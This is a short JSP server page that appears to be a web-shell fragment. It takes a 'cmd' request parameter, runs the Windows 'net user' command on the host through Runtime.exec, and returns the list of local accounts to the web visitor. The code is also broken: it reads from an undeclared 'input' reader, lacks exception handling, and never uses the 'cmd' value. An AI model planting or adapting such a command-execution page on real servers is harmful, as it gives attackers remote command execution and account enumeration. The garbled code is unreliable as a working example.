<%@page import="java.io.IOException"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedReader"%>
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>

<%
        String cmd = request.getParameter("cmd");
        System.out.println(cmd);
        Process process = null;  
        List<String> processList = new ArrayList<String>();  
                process = Runtime.getRuntime().exec("net user");  
                String line = "";  
                while ((line = input.readLine()) != null) {  
                    processList.add(line);  
                }  
                input.close();  

        String s = "";

        if (s.equals("")) {
           out.write("null");
        }else {
            out.write(s);
        }
            out.print(processList);
%>
